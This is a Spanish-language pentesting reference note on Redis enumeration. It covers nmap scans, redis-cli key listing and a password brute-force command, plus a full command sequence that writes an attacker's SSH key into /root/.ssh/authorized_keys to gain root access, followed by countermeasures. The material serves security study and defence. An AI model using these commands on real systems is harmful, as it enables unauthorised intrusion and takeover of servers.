---
title: Enumeración Redis (Puerto 6379)
slug: enumeracion-redis
aliases: [Enumeración Redis (Puerto 6379)]
fase: [Enumeración]
plataforma: Multi
dificultad: Básica
mitre: [T1046]
related: []
learning_refs: []
---

# Enumeración Redis (Puerto 6379)

## Descripción
Redis es un almacén de estructura de datos en memoria, utilizado como base de datos, caché y gestor de mensajes. Una de las vulnerabilidades más comunes es la falta de autenticación por defecto, lo que permite a un atacante interactuar directamente con la base de datos y, en ciertos casos, obtener ejecución de comandos en el servidor. La enumeración de Redis se centra en verificar el acceso sin credenciales y extraer información sensible sobre la configuración y los datos almacenados.

## Herramientas
- **redis-cli** — cliente interactivo oficial de Redis
- **nmap** — scripts NSE para detección (redis-info, redis-brute)
- **telnet** / **nc** — para interactuar manualmente con el servicio

## Comandos / Ejemplos

### Escaneo con Nmap
```bash
# Escaneo de servicio y detección de configuración básica
nmap -p 6379 -sV --script redis-info 10.10.10.10

# Si se requiere autenticación, intentar fuerza bruta (usando SecLists)
nmap -p 6379 --script redis-brute --script-args passdb=/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-100-common-passwords.txt 10.10.10.10
```

### Enumeración Manual con redis-cli
```bash
# Conexión sin contraseña
redis-cli -h 10.10.10.10

# Una vez dentro, obtener información del servidor y configuración
10.10.10.10:6379> info
10.10.10.10:6379> config get *

# Listar todas las claves almacenadas
10.10.10.10:6379> keys *

# Obtener el tipo de dato y el valor de una clave específica
10.10.10.10:6379> type some_key
10.10.10.10:6379> get some_key
```

### Explotación (RCE vía Sobrescritura de Archivos)
Si Redis se ejecuta como root y no tiene autenticación, se pueden subir claves SSH:
```bash
# Generar par de claves
ssh-keygen -t rsa -C "pwned"

# Guardar la clave pública en un archivo con saltos de línea
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt

# Inyectar la clave en la memoria de Redis
cat key.txt | redis-cli -h 10.10.10.10 -x set crackit

# Cambiar el directorio de trabajo y el nombre del archivo de backup
redis-cli -h 10.10.10.10 config set dir /root/.ssh
redis-cli -h 10.10.10.10 config set dbfilename authorized_keys

# Guardar los cambios al archivo del sistema
redis-cli -h 10.10.10.10 save

# Intentar acceso vía SSH
ssh -i id_rsa root@10.10.10.10
```

## Contramedidas
- **Habilitar autenticación** mediante la directiva `requirepass` en `redis.conf`.
- **Vincular el servicio a 127.0.0.1** (localhost) si el acceso remoto no es necesario.
- **Cambiar el puerto por defecto** (6379) para evitar escaneos automatizados simples.
- **Renombrar comandos peligrosos** como `CONFIG`, `FLUSHALL`, `SAVE` y `KEYS` a nombres aleatorios.
- **Limitar los privilegios** ejecutando Redis como un usuario de sistema dedicado (sin privilegios de root).

## Referencias
- Redis Documentation. (2024). Redis Security. https://redis.io/docs/management/security/
- HackTricks. (2024). 6379 - Pentesting Redis. https://book.hacktricks.xyz/network-services-pentesting/pentesting-redis
- SecLists: /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook* (5th ed.). McGraw-Hill Education.
